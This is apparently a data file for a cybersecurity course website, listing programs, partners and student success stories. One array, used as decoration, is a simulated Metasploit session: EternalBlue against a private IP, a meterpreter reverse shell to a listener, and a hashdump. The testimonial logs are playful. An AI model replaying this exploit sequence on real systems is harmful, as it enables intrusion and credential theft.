
export const heroProgramData = [
    {
        id: "masters",
        title: "Master’s in Ethical Hacking & Cybersecurity",
        duration: "1 Year",
        certification: "6 Global Certs",
        highlight: "100% Placement",
        stats: [
            { label: "Placement", value: "100%" },
            { label: "Certs", value: "6 Global" },
            { label: "Mode", value: "Hybrid" },
        ],
        color: "from-blue-600 to-cyan-600",
    },
    {
        id: "graduate",
        title: "Graduate Program in Cybersecurity",
        duration: "9 Months",
        certification: "2 Global Certs",
        highlight: "Job-Ready",
        stats: [
            { label: "Duration", value: "9 Months" },
            { label: "Certs", value: "2 Global" },
            { label: "Focus", value: "Defensive" },
        ],
        color: "from-purple-600 to-pink-600",
    },
    {
        id: "masterclass",
        title: "CEH v13 Masterclass",
        duration: "4 Months",
        certification: "CEH Master",
        highlight: "Elite Skills",
        stats: [
            { label: "Version", value: "v13 AI" },
            { label: "Level", value: "Expert" },
            { label: "Labs", value: "Real-time" },
        ],
        color: "from-orange-600 to-red-600",
    },
];

export const partnerCourses = [
    { name: "Cisco", logo: "/images/partners/cisco.png" },
    { name: "EC-Council", logo: "/images/partners/ec-council.png" },
    { name: "CompTIA", logo: "/images/partners/comptia.png" },
];

export const metapsploitLogs = [
    {
        type: "ascii", text: ` 
      _                                                    _
     / \\      _-'
   _/|  \\-''- _ /
  __  {  |  /  \\   }      _
      /  \\  |     }    _-'
     /    \\ |  _   \\_-'
    /      \\|  \\-''
` },
    { type: "info", text: "=[ metasploit v6.3.4-dev                            ]" },
    { type: "info", text: "+ -- --=[ 2384 exploits - 1236 auxiliary - 428 post       ]" },
    { type: "info", text: "+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]" },
    { type: "info", text: "+ -- --=[ 9 evasion                                       ]" },
    { type: "input", text: "msf6 > search windows/smb" },
    { type: "success", text: "[+] Found 142 matching modules" },
    { type: "input", text: "msf6 > use exploit/windows/smb/ms17_010_eternalblue" },
    { type: "info", text: "[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp" },
    { type: "input", text: "msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.110" },
    { type: "success", text: "RHOSTS => 192.168.1.110" },
    { type: "input", text: "msf6 exploit(ms17_010_eternalblue) > run" },
    { type: "info", text: "[*] Started reverse TCP handler on 192.168.1.5:4444" },
    { type: "success", text: "[+] 192.168.1.110:445 - Target is vulnerable." },
    { type: "info", text: "[*] 192.168.1.110:445 - Connecting to target..." },
    { type: "success", text: "[+] 192.168.1.110:445 - WIN!" },
    { type: "success", text: "[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.110:49231)" },
    { type: "input", text: "meterpreter > hashdump" },
    { type: "warning", text: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::" },
    { type: "input", text: "meterpreter > sysinfo" },
    { type: "info", text: "Computer: WIN-TARGET-01" },
    { type: "info", text: "OS: Windows 10 (10.0 Build 19045)" },
];

export const studentTransformationLogs = [
    { type: "info", text: "> INITIALIZING CAREER_UNLOCK_PROTOCOL..." },
    { type: "info", text: "> TARGET ROLE: CYBER SECURITY ANALYST" },
    { type: "progress", text: "Loading Module: Network_Defense", progress: 100 },
    { type: "progress", text: "Loading Module: VAPT_Framework", progress: 100 },
    { type: "success", text: "[OK] SKILLSET OPTIMIZED FOR MNC STANDARDS" },
    { type: "input", text: "$ bypass_salary_cap --force" },
    { type: "warning", text: "(!) DETECTING HIGH-VALUE OPPORTUNITIES..." },
    { type: "success", text: "[OK] OFFER LETTER ENCRYPTED." },
    { type: "success", text: "> DECRYPTING SUCCESS..." },
];

export const studentStories = [
    {
        name: "Rohan Mehta",
        role: "Cyber Security Analyst",
        company: "Infosys",
        package: "₹12 LPA",
        prevRole: "IT Support",
        image: "/testimonials/person1.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: ROHAN_M..." },
            { type: "info", text: "> CURRENT_STATUS: IT_SUPPORT_L1" },
            { type: "progress", text: "Injecting: Network_Security_Module", progress: 100 },
            { type: "progress", text: "Loading: CEH_Certification", progress: 100 },
            { type: "success", text: "[OK] SKILL GAP ELIMINATED" },
            { type: "input", text: "$ execute career_switch.exe" },
            { type: "success", text: "> OFFER DETECTED: INFOSYS" },
            { type: "success", text: "> CTC_UPGRADE: 300%" },
        ]
    },
    {
        name: "Priya Sharma",
        role: "VAPT Engineer",
        company: "Wipro",
        package: "₹9 LPA",
        prevRole: "Fresher (CS)",
        image: "/testimonials/person2.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: PRIYA_S..." },
            { type: "warning", text: "> EXPERIENCE_LEVEL: NULL (FRESHER)" },
            { type: "progress", text: "Compiling: Web_App_Pentesting", progress: 100 },
            { type: "progress", text: "Loading: BurpSuite_Mastery", progress: 100 },
            { type: "success", text: "[OK] PORTFOLIO GENERATED" },
            { type: "input", text: "$ run placement_drive.sh" },
            { type: "success", text: "> OFFER DETECTED: WIPRO" },
            { type: "success", text: "> FIRST_JOB_SECURED" },
        ]
    },
    {
        name: "Amit Verma",
        role: "SOC Analyst",
        company: "HCL",
        package: "₹10 LPA",
        prevRole: "Network Admin",
        image: "/testimonials/person3.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: AMIT_V..." },
            { type: "info", text: "> CURRENT_STATUS: NETWORK_ADMIN" },
            { type: "progress", text: " upgrading: Threat_Monitoring", progress: 100 },
            { type: "progress", text: "Loading: SIEM_Architecture", progress: 100 },
            { type: "success", text: "[OK] BLUE_TEAM_READY" },
            { type: "input", text: "$ sudo switch_domain" },
            { type: "success", text: "> OFFER DETECTED: HCL" },
            { type: "success", text: "> ROLE_UPGRADE_COMPLETE" },
        ]
    },
    {
        name: "Sneha Patel",
        role: "App Security Lead",
        company: "TCS",
        package: "₹14 LPA",
        prevRole: "Software Dev",
        image: "/testimonials/person4.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: SNEHA_P..." },
            { type: "info", text: "> BG: SOFTWARE_DEVELOPMENT" },
            { type: "progress", text: "Patching: Secure_Coding_Practices", progress: 100 },
            { type: "progress", text: "Loading: DevSecOps_Pipeline", progress: 100 },
            { type: "success", text: "[OK] SECURITY_CHAMPION_MODE" },
            { type: "input", text: "$ exploit market_demand" },
            { type: "success", text: "> OFFER DETECTED: TCS" },
            { type: "success", text: "> SENIOR_POSITION_UNLOCKED" },
        ]
    },
    {
        name: "Vikram Singh",
        role: "Ethical Hacker",
        company: "Deloitte",
        package: "₹18 LPA",
        prevRole: "System Admin",
        image: "/testimonials/person5.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: VIKRAM_S..." },
            { type: "info", text: "> TARGET: BIG_4_CONSULTING" },
            { type: "progress", text: "Loading: Advanced_Exploitation", progress: 100 },
            { type: "progress", text: "Loading: Red_Teaming_Ops", progress: 100 },
            { type: "success", text: "[OK] ELITE_HACKER_STATUS" },
            { type: "input", text: "$ crack_interview_rounds" },
            { type: "success", text: "> OFFER DETECTED: DELOITTE" },
            { type: "success", text: "> CAREER_PEAK_REACHED" },
        ]
    }
];
